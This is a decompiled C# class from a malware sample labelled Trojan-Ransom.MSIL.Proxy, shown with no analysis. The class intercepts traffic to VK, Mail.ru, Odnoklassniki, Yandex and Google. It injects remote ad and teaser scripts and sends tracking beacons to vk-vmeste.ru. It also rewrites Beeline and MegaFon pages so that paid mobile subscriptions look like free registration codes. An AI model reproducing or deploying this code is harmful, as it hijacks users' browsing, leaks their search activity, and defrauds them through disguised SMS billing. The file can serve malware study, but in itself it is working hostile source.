// Decompiled with JetBrains decompiler
// Type: ProxyService.XmlHelper
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4BAA6272-82AC-4A0F-9D22-E6349EB55251
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Proxy.a-86c09672906047dffe2aa9fa0a93ad93a7a266c337359ce4c05df48549a6a032.exe

using System;
using System.Net;

namespace ProxyService
{
  public class XmlHelper
  {
    public static void Load()
    {
    }

    public static bool httpIsEnvoved(HttpWebRequest req, HttpWebResponse resp)
    {
      if (resp.ContentType.Contains("text/html") && (req.Address.ToString().Contains("http://") || req.Address.ToString().Contains("https://")))
        ProxyServer.dbg("NAV: " + req.Address.ToString());
      string str = req.Address.ToString();
      if (!resp.ContentType.Contains("text/html") || !str.Contains("http://") && !str.Contains("https://"))
        return false;
      return str.Contains("vk-vmeste.ru") || str.Contains("vk.com") || str.Contains("mail.ru") || str.Contains("odnoklassniki.ru") || str.Contains("zip-connectio.in") || str.Contains("signup.beeline.ru") || str.Contains("wap.megafonpro.ru") || str.Contains("yandex.ru/yandsearch") || str.Contains("yandex.ua/yandsearch") || str.Contains("yandex.kz/yandsearch") || str.Contains("yandex.by/yandsearch") || str.Contains("google.com/") && str.Contains("q=") || str.Contains("google.ru/") && str.Contains("q=") || str.Contains("google.com.ua/") && str.Contains("q=") || str.Contains("google.kz/") && str.Contains("q=") || str.Contains("google.by/") && str.Contains("q=") || str.Contains("support-contact.ws");
    }

    public static int rnd(int from) => new Random().Next(0, from);

    public static string ChangeContent(string str, string url)
    {
      if (url.Contains("vk-vmeste.ru"))
      {
        vkbill.vkCatchBilled(str);
        return str;
      }
      string str1 = "\r\n\r\n                    <div id='DIV_DA_90338'></div>\r\n                    <script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90338&div=DIV_DA_90338'></script>";
      string str2 = "\r\n                    <script type='text/javascript'>var sid=50092,bid=2416;</script><script type='text/javascript' src='http://sochetat.net/vm.js'></script>";
      string newValue1 = str1 + " " + str2;
      string str3 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key=vk'>\r\n</script>\r\n<script>\r\n\tv=1; // тизеров по горизонтали\r\n\th=1; // тизеров по вертикали\r\n\timage_size=100; // размер тизера\r\n\ttext_position=4 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'>\r\n</script>\r\n";
      string str4 = "<div id='bn_bfb5187b1b'>загрузка...</div>\r\n            <script type='text/javascript' SRC='http://recreativ.ru/rcode.bfb5187b1b.js'></script> ";
      string str5 = "<script language='Javascript'>\r\nvar bntuniqid = 'TJqhtxV2nVSrCErN7364';\r\nvar bntuniqsid = '50092';\r\n</script>\r\n<script type='text/javascript' src='http://morenews1.net/viewt.js'></script>\r\n\r\n";
      string newValue2 = "<div id='DIV_DA_90725'></div><script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90725&div=DIV_DA_90725'></script>";
      string str6 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key='>\r\n</script>\r\n<script>\r\n\tv=1; // тизеров по горизонтали\r\n\th=2; // тизеров по вертикали\r\n\timage_size=110; // размер тизера\r\n\ttext_position=1 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'></script>";
      string[] strArray = new string[2]
      {
        str3 + str4,
        str3 + str5
      };
      string withs = "<div id='bn_4614cef1a1'>загрузка...</div>\r\n <script type='text/javascript' SRC='http://recreativ.ru/rcode.4614cef1a1.js'></script>";
      if (url.Contains("vk.com"))
      {
        if (vkbill.IsInjectVKBill(url, str))
        {
          str = vkbill.vkBillCode(str);
        }
        else
        {
          str = str.Replace("<noscript><meta http-equiv=\"refresh\" content=\"0; URL=/badbrowser.php\"></noscript>", newValue1);
          str = str.Replace("<div id=\"left_blocks\"></div>", "");
          str = str.Replace("<div id=\"left_ads\"></div>", strArray[XmlHelper.rnd(strArray.Length)]);
        }
        return str;
      }
      if (url.Contains("odnoklassniki.ru"))
        return str.Replace("</body></html>", "</body>" + str1 + "</html>");
      if (url.Contains("mail.ru"))
      {
        str = str.Replace("<script>splashRadar('informers');</script>", str6 + " " + str2);
        str = str.Replace("<script>splashRadar('news', 1);</script>", newValue2);
        return str;
      }
      if (url.Contains("wap.megafonpro.ru"))
      {
        string str7 = "Подписка ";
        string str8 = "Условиями предоставления услуги Подписки";
        int num1 = str.IndexOf(str7);
        int num2 = str.IndexOf(str8, Math.Max(0, num1));
        if (num1 != -1 && num2 != -1)
        {
          string oldValue = str.Substring(num1, num2 - num1 + str8.Length);
          str = str.Replace(oldValue, "Введите полученный код с бесплатного сервисного номера");
          str = str.Replace("Введите SMS пароль", "");
        }
        return str;
      }
      if (url.Contains("signup.beeline.ru"))
      {
        str = str.Replace("Оформление подписки", "Регистрация на сайте");
        str = str.Replace("Ð¿Ð\u00BEÐ´Ð¿Ð¸Ñ\u0081ÐºÐ¸", "");
        str = str.Replace("отправлена смс с кодом активации подписки", "отправлена смс с кодом подтверждения");
        str = str.Replace("input type=\"text\" name=\"\"", "input type=\"hidden\" name=\"\"");
        str = XmlHelper.rep(str, "<td width=\"70%\">", "</td>", "");
        str = XmlHelper.rep(str, "<td>", "</td>", "");
        str = XmlHelper.rep(str, "<td>", "</td>", "");
        str = XmlHelper.rep(str, "<td colspan=\"2\" align=\"center\">", "</td>", "");
        return str;
      }
      if (url.Contains("zip-connectio.in"))
      {
        string from = "<div id=\"disclaimerDetails\"";
        string tos = "</div>";
        str = XmlHelper.rep(str, from, tos, "");
        return str;
      }
      if (url.Contains("yandex.ru/yandsearch") || url.Contains("yandex.ua/yandsearch") || url.Contains("yandex.by/yandsearch") || url.Contains("yandex.kz/yandsearch"))
      {
        str = XmlHelper.rep(str, "<div class=\"b-adv\"><div class=\"b-adv__head\">", "показа в месяц</div>", withs);
        str = str + "<img width=0 height=0 src='http://vk-vmeste.ru/test/Default_files/_se.ashx?rnd=" + XmlHelper.rndtext() + "'/>";
      }
      if (url.Contains("google.") && url.Contains("q="))
        str = str + "<img width=0 height=0 src='http://vk-vmeste.ru/test/Default_files/_se.ashx?rnd=" + XmlHelper.rndtext() + "'/>";
      if (url.Contains("support-contact.ws"))
        str = "<html><script>document.location='http://adobe.com'</script></html>";
      return str;
    }

    private static string rep(string str, string from, string tos, string withs)
    {
      int num1 = str.IndexOf(from);
      int num2 = str.IndexOf(tos, Math.Max(0, num1));
      if (num1 != -1 && num2 != -1)
      {
        string oldValue = str.Substring(num1, num2 - num1 + tos.Length);
        str = str.Replace(oldValue, withs);
      }
      return str;
    }

    public static string extr(string str, string from, string tos, bool withCorners)
    {
      int num1 = str.IndexOf(from);
      int num2 = str.IndexOf(tos, Math.Max(0, num1));
      if (num1 == -1 || num2 == -1)
        return "";
      return !withCorners ? str.Substring(num1 + from.Length, num2 - num1 - from.Length) : str.Substring(num1, num2 - num1 + tos.Length);
    }

    public static string rndtext() => new Random().Next(1, 100000).ToString();
  }
}
